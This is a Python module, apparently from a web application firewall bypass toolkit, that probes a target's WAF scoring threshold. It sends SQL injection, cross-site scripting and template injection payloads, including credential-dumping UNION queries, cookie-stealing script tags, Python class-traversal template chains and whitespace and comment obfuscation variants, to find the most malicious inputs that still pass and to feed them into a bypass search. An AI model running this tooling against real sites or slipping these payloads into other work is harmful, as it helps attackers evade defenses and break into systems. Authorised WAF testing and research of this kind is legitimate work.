"""Scoring-engine threshold prober.

Modern WAFs (RedEye, Cloudflare, AWS WAF Advanced) don't just pattern-match —
they score each request with a confidence value (0.0–1.0) and block above a
threshold (~0.92 for RedEye).  This module maps the detection boundary:

  1. Which individual tokens the WAF scores (keyword map)
  2. Where the block/allow flip happens as payload complexity grows (threshold)
  3. The maximum-malice payloads that still pass (boundary payloads)

The output feeds directly into the bypass search: boundary payloads are the
ideal starting seeds (already at the detection edge — one good mutation may
push them through), and the keyword map tells the mutators which tokens need
obfuscation and which are invisible.

Non-destructive: every probe uses the existing Oracle/calibration path, so
--calibrate, --transport, --header/--cookie all thread through.  Payloads
carry the `CANARY` marker from cve_probe for safe log grepping.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Optional

from ..core.oracle import Oracle, Response, Target, BLOCKED, THROUGH

CANARY = "wafprobe7z"

# ── token tables ──────────────────────────────────────────────────────────

SQL_KEYWORDS = [
    "SELECT", "UNION", "OR", "AND", "FROM", "WHERE", "INSERT", "UPDATE",
    "DELETE", "DROP", "ORDER BY", "GROUP BY", "HAVING", "LIKE", "BETWEEN",
    "IN", "JOIN", "EXEC", "EXECUTE", "SLEEP", "BENCHMARK", "WAITFOR",
    "CONCAT", "SUBSTRING", "SUBSTR", "CHAR", "CAST", "CONVERT",
    "information_schema", "@@version", "version()", "sqlite_version()",
    # SQLite-specific (known gap in libinjection)
    "GLOB", "MATCH", "COLLATE", "ISNULL", "NOTNULL", "ESCAPE",
    "typeof()", "hex()", "iif()", "quote()", "randomblob()", "unicode()",
    "nullif()", "zeroblob()", "likelihood()", "RAISE(IGNORE)",
]

XSS_TOKENS = [
    "<script>", "</script>", "javascript:", "onerror", "onload", "onclick",
    "onmouseover", "onfocus", "ontoggle", "onbegin", "alert(", "prompt(",
    "confirm(", "eval(", "document.cookie", "document.domain",
    "<svg", "<img", "<iframe", "<body", "<input", "<details", "<object",
    "<embed", "<link", "<meta", "<base", "<form", "<a ", "<video", "<audio",
    "src=", "href=", "data:", "String.fromCharCode", "atob(", "btoa(",
]

SSTI_TOKENS = [
    "{{", "}}", "${", "<%=", "%>", "#{", "config", "__class__",
    "__mro__", "__subclasses__", "__globals__", "__builtins__",
    "__import__", "popen", "constructor", "prototype",
]

_CLASS_TOKENS = {
    "sqli": SQL_KEYWORDS,
    "xss": XSS_TOKENS,
    "ssti": SSTI_TOKENS,
}

# ── progressive strip chains ─────────────────────────────────────────────

# For each class, a reference payload broken into tokens from most-to-least
# suspicious.  The prober walks this list, dropping one token at a time from
# the full payload, to find the exact combination that flips the verdict.

_SQLI_STRIP_CHAIN = [
    "' UNION SELECT username,password FROM users-- -",
    "' UNION SELECT username,password FROM users",
    "' UNION SELECT username,password",
    "' UNION SELECT username",
    "' UNION SELECT",
    "' UNION",
    "' OR 1=1-- -",
    "' OR 1=1",
    "' OR 1",
    "' OR",
    "' AND 1=1-- -",
    "' AND 1=1",
    "' AND 1",
    "' AND",
    "'-- -",
    "'--",
    "'",
]

_XSS_STRIP_CHAIN = [
    "<script>alert(document.cookie)</script>",
    "<script>alert(1)</script>",
    "<script>alert(1)",
    "<script>",
    "<img src=x onerror=alert(1)>",
    "<img onerror=alert(1)>",
    "<img onerror=alert>",
    "<svg onload=alert(1)>",
    "<svg onload=alert>",
    "javascript:alert(1)",
    "javascript:",
    "onerror=alert(1)",
    "onerror=",
    "alert(1)",
    "alert(",
]

_SSTI_STRIP_CHAIN = [
    "{{config.__class__.__mro__[1].__subclasses__()}}",
    "{{config.__class__.__mro__}}",
    "{{config.__class__}}",
    "{{config}}",
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
]

_CLASS_STRIPS = {
    "sqli": _SQLI_STRIP_CHAIN,
    "xss": _XSS_STRIP_CHAIN,
    "ssti": _SSTI_STRIP_CHAIN,
}

# ── spacer / encoding variants for boundary probing ──────────────────────

_SQLI_SPACER_TEMPLATES = [
    "'{sp}OR{sp}1=1--",
    "'{sp}OR{sp}1=1",
    "'{co}OR{co}1=1--",
    "'{nl}OR{nl}1=1--",
    "'{tb}OR{tb}1=1--",
]

_SPACERS = {
    "sp": " ", "co": "/**/", "nl": "\n", "tb": "\t",
    "vt": "\x0b", "ff": "\x0c", "cr": "\r",
}


# ── data classes ─────────────────────────────────────────────────────────

@dataclass
class KeywordResult:
    token: str
    single_blocked: bool
    in_quote_blocked: bool     # ' <token> pattern

    @property
    def detected(self) -> bool:
        return self.single_blocked or self.in_quote_blocked


@dataclass
class StripResult:
    payload: str
    verdict: str        # BLOCKED | THROUGH | DOWN
    code: str


@dataclass
class BoundaryPayload:
    payload: str
    verdict: str
    note: str           # why this is at the boundary


@dataclass
class ScoreProbeResult:
    target_url: str
    attack_class: str
    keyword_map: list[KeywordResult] = field(default_factory=list)
    strip_chain: list[StripResult] = field(default_factory=list)
    boundary_payloads: list[BoundaryPayload] = field(default_factory=list)
    flip_index: int = -1                  # index in strip_chain where blocked→through
    requests_used: int = 0

    def as_dict(self) -> dict:
        return {
            "target": self.target_url,
            "class": self.attack_class,
            "flip_index": self.flip_index,
            "requests": self.requests_used,
            "keyword_map": {
                k.token: {"single": k.single_blocked, "in_quote": k.in_quote_blocked}
                for k in self.keyword_map
            },
            "strip_chain": [
                {"payload": s.payload, "verdict": s.verdict, "code": s.code}
                for s in self.strip_chain
            ],
            "boundary_payloads": [
                {"payload": b.payload, "verdict": b.verdict, "note": b.note}
                for b in self.boundary_payloads
            ],
        }


# ── core prober ──────────────────────────────────────────────────────────

class ScoreProber:
    def __init__(self, oracle: Oracle):
        self.oracle = oracle

    def _send(self, payload: str) -> Response:
        return self.oracle.send(payload)

    # -- 1. keyword detection map ------------------------------------------

    def map_keyword_detection(self, attack_class: str = "sqli") -> list[KeywordResult]:
        tokens = _CLASS_TOKENS.get(attack_class, SQL_KEYWORDS)
        results: list[KeywordResult] = []
        for token in tokens:
            r_single = self._send(token)
            r_quoted = self._send(f"' {token}")
            results.append(KeywordResult(
                token=token,
                single_blocked=(r_single.verdict == BLOCKED),
                in_quote_blocked=(r_quoted.verdict == BLOCKED),
            ))
        return results

    # -- 2. progressive strip (find the flip) ------------------------------

    def probe_threshold(self, attack_class: str = "sqli") -> tuple[list[StripResult], int]:
        chain = _CLASS_STRIPS.get(attack_class, _SQLI_STRIP_CHAIN)
        results: list[StripResult] = []
        flip_idx = -1
        prev_blocked = True

        for i, payload in enumerate(chain):
            r = self._send(payload)
            results.append(StripResult(payload=payload, verdict=r.verdict, code=r.code))
            is_blocked = (r.verdict == BLOCKED)
            if prev_blocked and not is_blocked:
                flip_idx = i
            prev_blocked = is_blocked

        return results, flip_idx

    # -- 3. boundary payloads (max malice that passes) ---------------------

    def find_boundary_payloads(self, attack_class: str = "sqli",
                               strip_results: Optional[list[StripResult]] = None,
                               flip_index: int = -1) -> list[BoundaryPayload]:
        if strip_results is None:
            strip_results, flip_index = self.probe_threshold(attack_class)

        boundaries: list[BoundaryPayload] = []

        if flip_index < 0 or flip_index >= len(strip_results):
            return boundaries

        # The payload AT flip_index is the first one that passed.
        # The payload at flip_index-1 is the last one blocked.
        # Generate variants between these two.

        last_blocked = strip_results[flip_index - 1].payload if flip_index > 0 else ""
        first_passed = strip_results[flip_index].payload

        boundaries.append(BoundaryPayload(
            payload=first_passed,
            verdict=THROUGH,
            note=f"first pass in strip chain (prev blocked: {last_blocked[:40]})",
        ))

        # Try spacer variants of the blocked payload — these may flip it
        if attack_class == "sqli" and last_blocked:
            for tmpl in _SQLI_SPACER_TEMPLATES:
                for sp_name, sp_char in _SPACERS.items():
                    candidate = tmpl.format(sp=sp_char, co="/**/",
                                            nl="\n", tb="\t")
                    if candidate == last_blocked:
                        continue
                    r = self._send(candidate)
                    if r.verdict == THROUGH:
                        boundaries.append(BoundaryPayload(
                            payload=candidate,
                            verdict=THROUGH,
                            note=f"spacer bypass ({sp_name} in blocked template)",
                        ))

        # Pair testing: for each detected keyword, try combining with a
        # benign-looking wrapper
        tokens = _CLASS_TOKENS.get(attack_class, SQL_KEYWORDS)
        wrappers = [
            "{canary}' {kw}",
            "{canary} {kw}",
            "test {kw} test",
        ]
        for token in tokens[:20]:
            for w in wrappers:
                candidate = w.format(canary=CANARY, kw=token)
                r = self._send(candidate)
                if r.verdict == THROUGH:
                    boundaries.append(BoundaryPayload(
                        payload=candidate,
                        verdict=THROUGH,
                        note=f"keyword '{token}' passes in context: {w}",
                    ))
                    break  # one passing wrapper per token is enough

        return boundaries

    # -- combined run -------------------------------------------------------

    def run(self, attack_class: str = "sqli") -> ScoreProbeResult:
        req_before = self.oracle.requests
        kw_map = self.map_keyword_detection(attack_class)
        strip_results, flip_idx = self.probe_threshold(attack_class)
        boundaries = self.find_boundary_payloads(
            attack_class, strip_results=strip_results, flip_index=flip_idx)
        return ScoreProbeResult(
            target_url=self.oracle.t.base_url,
            attack_class=attack_class,
            keyword_map=kw_map,
            strip_chain=strip_results,
            boundary_payloads=boundaries,
            flip_index=flip_idx,
            requests_used=self.oracle.requests - req_before,
        )
